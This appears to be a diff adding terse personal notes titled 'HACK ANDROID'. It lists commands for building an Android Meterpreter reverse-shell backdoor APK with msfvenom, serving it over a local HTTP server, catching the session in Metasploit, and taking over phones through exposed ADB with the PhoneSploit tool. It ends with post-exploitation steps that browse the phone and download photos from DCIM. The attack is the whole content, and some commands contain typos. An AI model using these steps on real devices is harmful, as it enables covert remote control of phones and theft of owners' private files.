@@ -1,0 +1,62 @@
+HACK ANDROID
+msfvenon -l payloads |grep android
+Hack Android with msfvenom
+msfvenom –p android/meterpreter/reverse_tcp LHOST=Localhost IP LPORT=LocalPort R > android_shell.apk 
+python3 -m http.server
+(this start an http server in the same directory of the payload)
+
+new tab>
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp 
+options
+set  LHOST Localhost
+set LPORT  LocalPort (ex. 4444)
+
+navigate to the server browser with the android machine
+whoami
+pwd
+cd /
+cd sdcard
+
+
+PHONESPLOIT ANDROID
+sudo nmap -sS -p- -Pn ip address
+55555 open freciv
+
+sudo apt install adb
+git clone https://github.com/aereosol-can/PhoneSploit
+cd PhoneSploit
+python3 -m pip install colorama
+python3 phonesploit.py
+
+type ip address of the phone
+press 4 
+ls 
+cd sdcardls
+cd pictures
+
+
+create an msfvenom payload 
+msfvenom -l payloads | grep android
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik -LHOST=Localhost IP LPORT=4444 -f raw -o backdoor.apk
+cp backdoor.apk Downloads/backdoor.apk
+python3 -m http.server (start in shell download folder where u copy the apk)
+
+run msfconsole 
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST
+SET LPORT
+
+
+metasploit session 
+sysinfo
+ipconfig
+pwd
+cd /sdcard
+ls
+ps (processes)
+cd DCIM
+download .filename
+ls -la
